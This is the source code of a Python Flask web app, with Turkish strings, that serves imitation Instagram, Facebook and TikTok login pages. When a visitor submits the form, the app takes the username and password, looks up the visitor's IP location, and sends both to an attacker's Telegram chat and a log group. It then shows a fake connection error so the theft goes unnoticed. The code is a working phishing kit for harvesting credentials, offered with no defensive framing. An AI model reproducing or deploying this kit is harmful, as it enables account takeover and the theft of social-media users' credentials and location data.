from flask import Flask, request, render_template_string
import requests
from bs4 import BeautifulSoup

app = Flask(__name__)

# Telegram bot ayarları - Bu değerleri kendi bot token'ınız ve grup ID'niz ile değiştirin
TELEGRAM_BOT_TOKEN = 'YOUR_TELEGRAM_BOT_TOKEN_HERE'
TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
LOG_GROUP_CHAT_ID = 'YOUR_LOG_GROUP_CHAT_ID_HERE' 

def get_client_ip(request):
    if request.headers.getlist("X-Forwarded-For"):
        ip_list = request.headers.getlist("X-Forwarded-For")[0]
        ip_address = ip_list.split(',')[0]  
        return ip_address
    else:
        return request.remote_addr

def ip_sorgula(ip_address):
    try:
        response = requests.get(f'https://ipinfo.io/{ip_address}/json')
        response.raise_for_status()
        data = response.json()

        ip_info = {
            "IP Adresi": data.get("ip", "Bulunamadı"),
            "Host Adı": data.get("hostname", "Bulunamadı"),
            "ISP": data.get("org", "Bulunamadı"),
            "Ülke": data.get("country", "Bulunamadı"),
            "Bölge": data.get("region", "Bulunamadı"),
            "Şehir": data.get("city", "Bulunamadı"),
            "Zaman Dilimi": data.get("timezone", "Bulunamadı")
        }

        formatted_text = (
            f"IP Adresi: {ip_info['IP Adresi']}\n"
            f"Host Adı: {ip_info['Host Adı']}\n"
            f"ISP: {ip_info['ISP']}\n"
            f"Ülke: {ip_info['Ülke']}\n"
            f"Bölge: {ip_info['Bölge']}\n"
            f"Şehir: {ip_info['Şehir']}\n"
            f"Zaman Dilimi: {ip_info['Zaman Dilimi']}\n"
        )
        return formatted_text

    except requests.RequestException as e:
        return f"IP bilgileri alınamadı: {str(e)}."

def get_login_page(platform):
    if platform == 'instagram':
        return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Instagram Giriş</title>
            <style>
                @import url('https://fonts.googleapis.com/css2?family=Lobster&display=swap');
                body, html {
                    height: 100%;
                    margin: 0;
                    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
                    background-color: #fafafa;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    flex-direction: column;
                    overflow-y: auto;
                }
                .logo-container {
                    margin-top: 20px;
                }
                .logo-container img {
                    width: 200px;
                    display: block;
                    margin: 0 auto;
                }
                .login-container {
                    background-color: #ffffff;
                    padding: 20px 40px;
                    border: 1px solid #dbdbdb;
                    width: 100%;
                    max-width: 350px;
                    box-shadow: 0 0 10px rgba(0,0,0,0.1);
                    text-align: center;
                    margin-top: 20px;
                }
                .login-container input {
                    width: 100%;
                    padding: 9px;
                    margin: 5px 0 12px;
                    background: #fafafa;
                    border: 1px solid #dbdbdb;
                    border-radius: 3px;
                    box-sizing: border-box;
                    font-size: 14px;
                }
                .login-container button {
                    width: 100%;
                    background-color: #0095f6;
                    border: none;
                    padding: 8px;
                    color: white;
                    font-weight: bold;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 14px;
                    margin-top: 12px;
                }
                .login-container button:hover {
                    background-color: #007ac1;
                }
                .forgot-password {
                    margin-top: 15px;
                    font-size: 12px;
                    color: #00376b;
                    text-decoration: none;
                }
                .forgot-password:hover {
                    text-decoration: underline;
                }
                .signup-link {
                    margin-top: 20px;
                    font-size: 14px;
                    color: #262626;
                }
                .signup-link a {
                    color: #0095f6;
                    text-decoration: none;
                }
                .signup-link a:hover {
                    text-decoration: underline;
                }
                .divider {
                    display: flex;
                    align-items: center;
                    text-align: center;
                    margin: 15px 0;
                }
                .divider::before,
                .divider::after {
                    content: '';
                    flex: 1;
                    border-bottom: 1px solid #dbdbdb;
                }
                .divider:not(:empty)::before {
                    margin-right: .25em;
                }
                .divider:not(:empty)::after {
                    margin-left: .25em;
                }
                .facebook-login {
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    background-color: #1877f2;
                    color: white;
                    border: none;
                    padding: 10px;
                    margin-bottom: 15px;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 14px;
                    font-weight: bold;
                }
                .facebook-login img {
                    margin-right: 10px;
                    width: 20px;
                    height: 20px;
                }
                .meta-footer {
                    margin-top: 50px;
                    font-size: 12px;
                    color: #8e8e8e;
                    text-align: center;
                }
                .meta-footer img {
                    width: 70px;
                }
            </style>
            <script>
                function openNewTab(platform) {
                    const currentUrl = window.location.href;
                    const newUrl = currentUrl.replace('instagram', platform);
                    window.open(newUrl, '_blank');
                }
            </script>
        </head>
        <body>
            <div class="logo-container">
                <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram Logo">
            </div>
            <div class="login-container">
                <button class="facebook-login" onclick="openNewTab('facebook')">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">Facebook ile Devam Et
                </button>
                <div class="divider">YA DA</div>
                <form method="POST">
                    <input type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta">
                    <input type="password" name="password" placeholder="Şifre">
                    <button type="submit">Giriş yap</button>
                </form>
                <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
                <div class="signup-link">Hesabın yok mu? <a href="#">Kaydol</a></div>
            </div>
            <div class="meta-footer">
                 <img src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg" alt="Meta Logo">
            </div>
        </body>
        </html>
        '''
    elif platform == 'facebook':
        return '''
        <!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Giriş</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
        }

        .container {
            background-color: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
            width: 100%;
            max-width: 360px;
        }

        .facebook-logo img {
            width: 50px;
            margin-bottom: 20px;
        }

        h2 {
            font-size: 1.5rem;
            color: #1877F2;
            margin-bottom: 20px;
        }

        input[type="text"],
        input[type="password"] {
            width: 100%;
            padding: 14px;
            margin-bottom: 12px;
            border-radius: 6px;
            border: 1px solid #dddfe2;
            font-size: 16px;
            background-color: #f5f6f7;
        }

        button {
            width: 100%;
            background-color: #1877F2;
            color: white;
            border: none;
            padding: 14px;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 15px;
        }

        button:hover {
            background-color: #166fe5;
        }

        a {
            color: #1877F2;
            text-decoration: none;
            font-size: 14px;
        }

        a:hover {
            text-decoration: underline;
        }

        .new-account {
            display: block;
            margin: 20px 0;
            padding: 14px;
            font-size: 16px;
            border: 1px solid #1877F2;
            border-radius: 6px;
            background-color: white;
            color: #1877F2;
        }

        .meta-footer {
            font-size: 12px;
            color: #606770;
            margin-top: 20px;
        }

        .meta-footer img {
            width: 70px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="facebook-logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
        </div>
        <h2>Facebook Giriş Yap</h2>
        <form method="POST">
            <input type="text" name="username" placeholder="Cep telefonu numarası veya e-posta adresi" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
        <a href="#">Şifreni mi unuttun?</a>
        <a href="#" class="new-account">Yeni Hesap Oluştur</a>
        <div class="meta-footer">
            <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHfyGLfULLT_vGdZ4cIihYLAB2AagXqQ0I3w&usqp=CAU" alt="Meta Logo">
        </div>
    </div>
</body>
</html>
        '''
    elif platform == 'tiktok':
        return '''
        <!DOCTYPE html>
        <html lang="en">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>TikTok Giriş</title>
            <style>
                body, html {
                    margin: 0;
                    padding: 0;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100%;
                    font-family: Arial, sans-serif;
                    background-color: #f2f2f2;
                }
                .container {
                    background-color: white;
                    padding: 40px;
                    border-radius: 10px;
                    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
                    text-align: center;
                    max-width: 400px;
                    width: 100%;
                }
                .logo-container img {
                    width: 150px;
                    margin-bottom: 20px;
                }
                h2 {
                    color: #333;
                    font-size: 24px;
                    margin-bottom: 20px;
                }
                .login-container {
                    display: flex;
                    flex-direction: column;
                }
                .login-container input {
                    padding: 10px;
                    margin-bottom: 15px;
                    font-size: 16px;
                    border: 1px solid #ccc;
                    border-radius: 5px;
                    width: 100%;
                    box-sizing: border-box;
                }
                .login-container button {
                    padding: 10px;
                    background-color: #ff0050;
                    color: white;
                    border: none;
                    border-radius: 5px;
                    font-size: 16px;
                    cursor: pointer;
                    margin-top: 10px;
                }
                .login-container button:hover {
                    background-color: #d4003d;
                }
                .divider {
                    display: flex;
                    align-items: center;
                    text-align: center;
                    margin: 20px 0;
                }
                .divider::before, .divider::after {
                    content: '';
                    flex: 1;
                    border-bottom: 1px solid #ccc;
                }
                .divider::before {
                    margin-right: 10px;
                }
                .divider::after {
                    margin-left: 10px;
                }
                .signup-link {
                    margin-top: 20px;
                    font-size: 14px;
                    color: #333;
                }
                .signup-link a {
                    color: #ff0050;
                    text-decoration: none;
                }
                .signup-link a:hover {
                    text-decoration: underline;
                }
                .facebook-button, .google-button {
                    padding: 10px;
                    font-size: 16px;
                    cursor: pointer;
                    border-radius: 5px;
                    width: 100%;
                    margin-bottom: 10px;
                }
                .facebook-button {
                    background-color: #4267B2;
                    color: white;
                    border: none;
                }
                .google-button {
                    background-color: white;
                    color: black;
                    border: 1px solid #ccc;
                }
            </style>
            <script>
                function openNewTab(platform) {
                    const currentUrl = window.location.href;
                    const newUrl = currentUrl.replace('tiktok', platform);
                    window.open(newUrl, '_blank');
                }
            </script>
        </head>
        <body>
            <div class="container">
                <div class="logo-container">
                    <img src="https://assets-global.website-files.com/642dd814982ac374c9b86e6f/644cd14ffcacf75a71900290_1200px-TikTok_logo.svg.png" alt="TikTok Logo">
                </div>
                <h2>TikTok Giriş Yap</h2>
                <form method="POST" class="login-container">
                    <input type="text" name="username" placeholder="Telefon numarası, e-posta veya kullanıcı adı" required>
                    <input type="password" name="password" placeholder="Şifre" required>
                    <button type="submit">Giriş Yap</button>
                </form>
                <div class="divider">YA DA</div>
                <button class="facebook-button" onclick="openNewTab('facebook')">Facebook ile Devam Et</button>
                <button class="google-button" onclick="openNewTab('google')">Google ile Devam Et</button>
                <div class="signup-link">
                    Hesabın yok mu? <a href="#">Kaydol</a>
                </div>
            </div>
        </body>
        </html>
        '''
    return 'hmmm bişey bulamadık😕'  

@app.route('/login/<platform>/<chat_id>', methods=['GET', 'POST'])
def login(platform, chat_id):
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        ip_address = get_client_ip(request)  

        ip_info = ip_sorgula(ip_address)

        message = f"*{platform.title()} Giriş Bilgileri*:\n\n"
        message += f"🔑 *Kullanıcı Adı*: `{username}`\n"
        message += f"🔒 *Şifre*: `{password}`\n\n"
        message += f"🌍 *IP Bilgileri*:\n{ip_info}\n"

        send_to_telegram(chat_id, message)  

        user_profile_url = f"tg://user?id={chat_id}"
        log_message = f"{message}\n👤 [Kullanıcı Profili]({user_profile_url})"
        send_to_telegram(LOG_GROUP_CHAT_ID, log_message)  

        return "bağlantı sorunu! lütfen daha sonra tekrar deneyiniz."

    return render_template_string(get_login_page(platform))

def send_to_telegram(chat_id, message):
    data = {
        'chat_id': chat_id,
        'text': message,
        'parse_mode': 'Markdown'
    }
    requests.post(TELEGRAM_API_URL, data=data)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

